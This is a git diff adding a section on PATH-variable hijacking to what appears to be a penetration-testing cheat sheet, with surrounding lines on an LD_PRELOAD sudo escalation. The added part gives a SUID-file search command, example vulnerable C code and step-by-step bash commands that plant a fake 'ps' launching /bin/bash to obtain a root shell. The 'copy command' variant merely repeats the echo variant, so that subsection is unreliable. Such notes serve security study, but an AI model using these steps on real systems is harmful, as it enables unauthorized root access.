@@ -833,6 +833,42 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ls -al shell.so
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
+
+6. Using PATH Variable
+- detection: run 'find / -perm -u=s -type f 2>/dev/null', check if there is non-system program/directory e.g. /home/raj/script. in that directory, there MUST exist a provided shell/program for us to execute i.e. shell2
+- assuming shell2 is found in /home/raj/script, and is running system function 'ps'. it can be 'id', etc
+```c
+#example shell2 code that must contain system binaries
+#include<unistd.h>
+void main()
+{setuid(0);
+setgid(0);
+system("ps");
+}
+```
+
+- (exploitation using echo command)
+```bash
+./shell2
+cd /tmp
+echo "/bin/bash" > ps
+chmod 777 ps
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/raj/script
+./shell2
+```
+- (exploitation using copy command)
+ ```bash
+./shell2
+cd /tmp
+echo "/bin/bash" > ps
+chmod 777 ps
+echo $PATH
+export PATH=/tmp:$PATH
+cd /home/raj/script
+./shell2
+ ```
   
 # Active Directory Pentesting
 ## Enumeration
